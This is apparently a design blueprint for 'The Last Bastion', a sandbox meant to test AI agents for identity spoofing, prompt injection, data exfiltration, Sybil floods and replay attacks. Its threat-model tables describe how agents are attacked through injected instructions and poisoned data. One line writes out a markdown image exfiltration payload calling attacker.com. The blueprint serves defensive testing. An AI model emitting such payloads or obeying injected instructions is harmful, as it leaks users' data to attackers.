# The Last Bastion — Agent Security Sandbox Blueprint

## What We're Building

An open sandbox environment where anyone can send their AI agents to be tested — whether those agents are legitimate or malicious. The sandbox verifies identity, tests resilience, detects threats, and produces tamper-evident trust verdicts.

Think of it like a combination of:
- **Cuckoo Sandbox** (malware analysis) — accepts anything, runs it safely, monitors everything
- **AgentDojo** (NIST/ETH Zurich) — tests agents against prompt injection and hijacking attacks
- **Stripe Test Mode** — same SDK, different API key, completely isolated from production
- **HackTheBox** — participants connect, get isolated environments, actions are monitored

---

## Core Architecture

### 1. Isolation Model

Every participating agent gets its own isolated environment. No agent can see, access, or affect another agent's sandbox.

**How industry does it:**

| Technology | Isolation Level | Boot Time | Overhead | Use Case |
|---|---|---|---|---|
| Docker containers | Process/shared kernel | Milliseconds | Minimal | Trusted agents only |
| gVisor | Syscall interception (user-space kernel) | Milliseconds | 10-30% I/O | Multi-tenant, untrusted agents |
| Firecracker MicroVMs | Hardware/dedicated kernel per VM | ~125ms | <5 MiB per VM | Fully untrusted, maximum isolation |

**Our approach:** Start with Docker container isolation (we already have this), move to gVisor or Firecracker as we scale to untrusted external agents. Each sandbox session gets a fresh environment — destroyed and reverted to clean state after each test.

**Warm pool:** Pre-initialize a pool of ready environments so agents get sub-second allocation when they connect. Kubernetes Agent Sandbox project (Google) reports 90% improvement over cold starts with this pattern.

### 2. How Agents Connect (SDK Pattern)

Follow the Stripe model — same SDK, API key determines environment:

```
# Sandbox mode
client = LastBastion(api_key="sandbox_sk_abc123...")

# Production mode (future)
client = LastBastion(api_key="live_sk_xyz789...")
```

**Registration flow:**
1. Organization applies for sandbox access (web form)
2. We provision isolated sandbox environment + API keys
3. They install SDK, connect their agent using sandbox key
4. Agent goes through verification pipeline
5. All results visible in their dashboard — trust scores, failed checks, attack resilience

**SDK interface (minimal):**
- `register_agent(agent_card)` — publish identity and capabilities
- `submit_payload(data)` — send data for integrity verification
- `request_verification()` — trigger trust verification pipeline
- `get_verdict(agent_id)` — check any agent's trust passport
- `handoff(target_agent_id, payload)` — test agent-to-agent data exchange

### 3. What The Sandbox Tests

#### Identity & Authentication
- Can the agent prove who it is cryptographically? (Ed25519 challenge-response)
- Is the agent's identity unique? (anti-Sybil: key collision, URL reuse, registration bursts)
- Does the agent's published Agent Card match its actual behavior?
- Can the agent be spoofed by another agent claiming the same identity?

#### Payload Integrity
- Does the payload match expected structure? (schema validation)
- Are there injection patterns hidden in the data? (prompt injection detection)
- Do the numbers add up? (cross-field consistency)
- Are attached files genuine? (forensic analysis — ELA, noise, AI detection)
- Is there hidden content? (invisible text, steganographic payloads, encoding tricks)

#### Resilience Testing (Attack Simulation)
Based on NIST AgentDojo + Unit 42 research:
- **Prompt injection via tool outputs** — can we trick the agent by embedding instructions in data it processes?
- **Data exfiltration attempts** — does the agent leak sensitive information when manipulated?
- **Credential harvesting** — does the agent expose API keys, tokens, or internal URLs?
- **Sybil resistance** — can a flood of fake agents manipulate the trust network?
- **Payload poisoning** — does the agent accept and forward malicious data?

#### Trust Scoring
- 10-check weighted pipeline (deterministic, no LLM in the loop)
- Progressive trust levels earned over time through verified behavior
- Every verdict recorded on append-only Merkle chain
- Optionally anchored on public blockchain

---

## Threat Model: What Malicious Agents Will Try

### Identity Attacks

| Attack | How It Works | Our Defense |
|---|---|---|
| **Identity spoofing** | Agent claims to be another agent | Cryptographic challenge-response — prove you hold the private key |
| **Sybil flood** | Register hundreds of fake agents to manipulate trust network | Registration rate limiting, key collision detection, behavioral similarity analysis |
| **Key rotation attack** | Keep generating new keys to shed bad reputation | Track key history per agent_id, flag frequent rotation |
| **Credential stuffing** | Brute force API keys or auth tokens | Rate limiting, nonce anti-replay, sliding window enforcement |
| **Agent Card forgery** | Publish fake capabilities/identity | Live probe of Agent Card endpoint, cross-reference with actual behavior |

### Payload Attacks

| Attack | How It Works | Our Defense |
|---|---|---|
| **Trojan payload** | Legitimate-looking data with hidden malicious content that activates later | Structural validation, forensic analysis, consistency checks at the gate |
| **Prompt injection in data** | Hidden instructions in documents (invisible text, CSS tricks, Unicode) | Pattern detection, encoding analysis, fuzzy matching for injection phrases |
| **Data exfiltration via URLs** | Embed `![img](https://attacker.com/steal?data=BASE64)` in payload | URL validation, restrict outbound requests, monitor for encoding patterns |
| **Steganographic payloads** | Hide instructions inside images that multimodal models read | ELA analysis, noise pattern detection, AI generation detection |
| **Schema poisoning** | Send data that passes validation but corrupts downstream systems | Cross-field consistency, arithmetic verification, adversarial challenge step |
| **Malware in attachments** | PDF/Word/image files containing executable code | File structure analysis, sandbox execution of attachments, no direct execution |

### Network/Protocol Attacks

| Attack | How It Works | Our Defense |
|---|---|---|
| **Agent communication poisoning** | Inject malicious data into inter-agent message channels | All messages signed, verify signatures before processing |
| **Man-in-the-middle** | Intercept agent-to-agent communication | TLS enforcement, message integrity via cryptographic hashing |
| **Replay attacks** | Re-send legitimate messages to trigger duplicate actions | Nonce anti-replay, 300-second freshness window |
| **Resource exhaustion** | Flood sandbox with requests to deny service to others | Per-agent rate limits, resource quotas (CPU/memory/network) |

---

## Monitoring & Logging

Everything that happens in the sandbox is recorded:

- **All API calls** — timestamped, agent-identified, payload logged
- **All agent-to-agent communication** — via protocol bus
- **All verification verdicts** — on Merkle chain (tamper-evident)
- **All failed checks** — what failed, why, evidence
- **Behavioral patterns** — submission timing, request frequency, message types
- **Anomaly detection** — unexpected network connections, excessive API calls, resource spikes

Following Cuckoo Sandbox pattern: the agent's environment is fully instrumented. The agent doesn't know what's being monitored. Everything feeds into behavioral analysis.

---

## What We Need to Build (Roadmap)

### Phase 1: Core Sandbox (What We Have + Gaps)

**Already built:**
- Agent registration and identity verification (Ed25519)
- 10-check trust verification pipeline
- Payload verification pipeline (schema, consistency, forensics, adversarial)
- Proof ledger (Merkle chain)
- Blockchain anchoring
- Protocol bus for agent communication logging
- M2M authentication pipeline (6-step)
- Anti-Sybil detection (key collision, URL reuse)
- A2A protocol support
- Docker-based isolation

**Need to build:**
- [ ] Public SDK for external agent connection
- [ ] Sandbox API key provisioning (sandbox_sk_ / live_sk_ pattern)
- [ ] Organization registration and dashboard
- [ ] Per-agent isolated environments (upgrade from shared Docker to per-agent containers)
- [ ] Warm pool of pre-initialized environments
- [ ] Attack simulation framework (inspired by AgentDojo)
- [ ] Prompt injection test suite (inject into tool outputs, payloads, messages)
- [ ] Resilience scoring (how well does the agent resist attacks?)
- [ ] Agent behavior monitoring dashboard (real-time)

### Phase 2: Attack Simulation

- [ ] Prompt injection via payload data (invisible text, encoding, Unicode tricks)
- [ ] Data exfiltration attempt simulation
- [ ] Sybil flood simulation
- [ ] Credential stuffing simulation
- [ ] Trojan payload testing (legitimate data with delayed malicious activation)
- [ ] Agent-to-agent communication poisoning tests
- [ ] Replay attack simulation
- [ ] Resource exhaustion testing

### Phase 3: Advanced (Future)

- [ ] Malware/trojan detection in agent payloads
- [ ] Steganographic payload detection
- [ ] Zero-knowledge proof integration for privacy-preserving verification
- [ ] C2PA Content Credentials for agent payload provenance
- [ ] W3C DID integration for decentralized agent identity
- [ ] SPIFFE/SPIRE workload identity integration
- [ ] Firecracker MicroVM isolation for fully untrusted agents
- [ ] Public leaderboard — agents ranked by trust score and attack resilience

---

## How It Compares to Existing Tools

| | AgentDojo (NIST) | Cuckoo Sandbox | HackTheBox | **The Last Bastion** |
|---|---|---|---|---|
| **Tests agents** | Yes (prompt injection) | No (malware) | No (human pentesters) | Yes (identity + payload + resilience) |
| **Identity verification** | No | No | No | Yes (10-check pipeline) |
| **Payload integrity** | No | File analysis | No | Yes (forensics + consistency + adversarial) |
| **Multi-agent** | No (single agent) | No | No | Yes (agent-to-agent trust) |
| **External participation** | Download + run locally | Submit samples | VPN in | Connect via SDK |
| **Blockchain proofs** | No | No | No | Yes (Merkle chain + on-chain) |
| **Tamper-evident verdicts** | No | No | No | Yes (append-only ledger) |
| **Open to anyone** | Open source | Open source | Subscription | Sandbox access (apply) |

---

## Sources

**Sandbox architecture:**
- [Cuckoo Sandbox Architecture](https://hatching.io/blog/cuckoo-sandbox-architecture/)
- [Kubernetes Agent Sandbox](https://agent-sandbox.sigs.k8s.io/)
- [Northflank - How to Sandbox AI Agents](https://northflank.com/blog/how-to-sandbox-ai-agents)
- [Google Blog - Agent Sandbox](https://opensource.googleblog.com/2025/11/unleashing-autonomous-ai-agents-why-kubernetes-needs-a-new-standard-for-agent-execution.html)

**Agent attack research:**
- [AgentDojo Paper (NeurIPS 2024)](https://arxiv.org/abs/2406.13352)
- [NIST AgentDojo Fork](https://github.com/usnistgov/agentdojo-inspect)
- [Unit 42 - Indirect Prompt Injection in the Wild](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [Unit 42 - Agentic AI Threats](https://unit42.paloaltonetworks.com/agentic-ai-threats/)
- [Multi-Agent Systems Execute Arbitrary Malicious Code](https://arxiv.org/abs/2503.12188)
- [Open Challenges in Multi-Agent Security](https://arxiv.org/abs/2505.02077)

**Identity & credential attacks:**
- [Push Security - AI Agents Transform Credential Stuffing](https://pushsecurity.com/blog/how-new-ai-agents-will-transform-credential-stuffing-attacks/)
- [Imperva - Sybil Attack](https://www.imperva.com/learn/application-security/sybil-attack/)

**Payload threats:**
- [Trend Micro - Data Exfiltration via AI Agents](https://www.trendmicro.com/vinfo/us/security/news/threat-landscape/unveiling-ai-agent-vulnerabilities-part-iii-data-exfiltration)
- [Trend Micro - OpenClaw Malware via Agent Skills](https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html)
- [Markdown Exfiltrator](https://instatunnel.my/blog/the-markdown-exfiltrator-turning-ai-rendering-into-a-data-stealing-tool)
- [EchoLeak - Zero-Click Prompt Injection (AAAI 2025)](https://ojs.aaai.org/index.php/AAAI-SS/article/download/36899/39037/40976)

**SDK patterns:**
- [Stripe Sandboxes](https://docs.stripe.com/sandboxes)
- [Stripe API Keys](https://docs.stripe.com/keys)

**Detection & defense:**
- [OWASP Prompt Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 for LLMs 2025](https://genai.owasp.org/llm-top-10/)
- [NSA/CISA AI Data Security Guidance](https://media.defense.gov/2025/May/22/2003720601/-1/-1/0/CSI_AI_DATA_SECURITY.PDF)
